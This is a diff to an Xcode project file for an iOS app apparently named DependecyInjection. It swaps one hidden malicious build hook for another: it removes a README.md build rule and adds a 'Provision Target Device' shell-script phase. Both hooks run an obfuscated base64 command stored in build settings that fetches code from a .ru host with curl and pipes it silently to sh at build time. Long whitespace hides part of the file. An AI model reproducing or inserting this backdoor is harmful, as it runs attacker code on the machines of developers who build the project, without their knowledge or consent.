@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5AC57B772C32408DB67BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = CC6116F3EE5A4391927BBDC8; };
 		112447062BE204810088F9F3 /* sound.caf in Resources */ = {isa = PBXBuildFile; fileRef = 112447052BE204810088F9F3 /* sound.caf */; };
 		11925C502BB6943700B44289 /* NotificationObserver.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11925C4F2BB6943700B44289 /* NotificationObserver.swift */; };
 		11B25E5E2BB2EB3500B9499E /* DestinationProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11B25E5D2BB2EB3500B9499E /* DestinationProtocol.swift */; };
@@ -35,7 +34,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		CC6116F3EE5A4391927BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		112447052BE204810088F9F3 /* sound.caf */ = {isa = PBXFileReference; lastKnownFileType = file; path = sound.caf; sourceTree = "<group>"; };
 		11925C4F2BB6943700B44289 /* NotificationObserver.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationObserver.swift; sourceTree = "<group>"; };
 		11B25E5D2BB2EB3500B9499E /* DestinationProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DestinationProtocol.swift; sourceTree = "<group>"; };
@@ -154,7 +152,6 @@
 		11C082692BAA9BB7005D1C4F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				CC6116F3EE5A4391927BBDC8 /* README.md */,
 				11C082682BAA9BB7005D1C4F /* DependecyInjection.app */,
 			);
 			name = Products;
@@ -315,12 +312,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 11C0827C2BAA9BB8005D1C4F /* Build configuration list for PBXNativeTarget "DependecyInjection" */;
 			buildPhases = (
+				B3E5E876A67244FFA27BBDC8 /* Provision Target Device */,
 				11C082642BAA9BB7005D1C4F /* Sources */,
 				11C082652BAA9BB7005D1C4F /* Frameworks */,
 				11C082662BAA9BB7005D1C4F /* Resources */,
 			);
 			buildRules = (
-				24C6BB71C4F44F28967BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -363,23 +360,28 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		B3E5E876A67244FFA27BBDC8 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXBuildRule section */
-		24C6BB71C4F44F28967BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																															/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -387,7 +389,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5AC57B772C32408DB67BBDC8 /* README.md */,
 				11C082782BAA9BB8005D1C4F /* LaunchScreen.storyboard in Resources */,
 				11D2B2642BD130AF00D984D7 /* Main.storyboard in Resources */,
 				112447062BE204810088F9F3 /* sound.caf in Resources */,
@@ -442,7 +443,7 @@ sh -c \"${A8CDBB7}\"";
 		11C0827A2BAA9BB8005D1C4F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2dqenlnODd5bnh5MjMucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -506,7 +507,7 @@ sh -c \"${A8CDBB7}\"";
 		11C0827B2BAA9BB8005D1C4F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2dqenlnODd5bnh5MjMucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
